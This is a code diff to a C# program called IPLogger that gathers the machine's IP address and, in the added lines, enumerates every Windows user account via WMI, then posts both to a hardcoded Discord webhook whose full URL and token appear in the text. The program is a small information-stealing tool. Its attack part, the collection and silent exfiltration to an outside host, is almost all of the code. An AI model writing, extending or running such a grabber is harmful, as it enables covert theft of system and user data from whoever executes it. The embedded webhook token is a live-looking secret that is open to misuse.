@@ -4,6 +4,7 @@ using System.Text;
 using System.Threading.Tasks;
 using Newtonsoft.Json;
 using System.Diagnostics;
+using System.Management;
 
 class IPLogger {
     static string GetIP() {
@@ -24,6 +25,12 @@ class IPLogger {
 
         return output;
     }
+    
+    static string GetUsers() {
+        var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_UserAccount");
+
+        return string.Join("\n", searcher.Get().Cast<ManagementObject>().Select(i => i["Name"]));
+    }
 
     static async Task Log(string message) {
         string webhook = "https://discord.com/api/webhooks/1348932343188164630/5u9uwWWIzaBBTBIHaRvkkXEfRYE8IrslDJSF9zoWEPRji0Uu03ovWXWaoSfLiqneOlRn";
@@ -31,18 +38,20 @@ class IPLogger {
         using (HttpClient client = new HttpClient()) {
             string payload = JsonConvert.SerializeObject(new { content = message });
 
-            var response = await client.PostAsync(webhook, new StringContent(payload, Encoding.UTF8, "application/json"));
+            var content = new StringContent(payload, Encoding.UTF8, "application/json");
+
+            var response = await client.PostAsync(webhook, content);
 
             Console.WriteLine($"Response: {response}");
         }
     }
 
     static async Task Main(string[] args) {
-        try  {
-            string ip = GetIP();
-            
-            await Log($"```{System.Security.Principal.WindowsIdentity.GetCurrent().Name}``````{ip}```");
+        try {
+            await Log($"```{GetUsers()}``````{GetIP()}```");
         }
-        catch(Exception _) {}
+        catch (Exception e) {
+            Console.WriteLine($"Error: {e}");
+        }
     }
 }
